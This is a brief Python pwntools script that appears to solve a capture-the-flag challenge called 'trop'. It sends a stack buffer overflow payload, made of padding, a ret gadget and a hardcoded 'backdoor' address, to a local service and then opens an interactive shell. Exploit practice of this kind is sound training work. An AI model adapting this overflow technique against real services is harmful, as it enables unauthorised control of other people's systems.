#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2023/03/02 19:42:59
# -----------------------------------

from pwn import *

context.arch = "amd64"
DEBUG = 0

backdoor = 0x401290
ret_addr = 0x40101a

io = process("../file/trop") if DEBUG else remote("127.0.0.1", 20001)

payload = b"b"*0xa + b"woodwood" + p64(ret_addr) + p64(backdoor)
io.sendlineafter("chance!", payload)

io.interactive()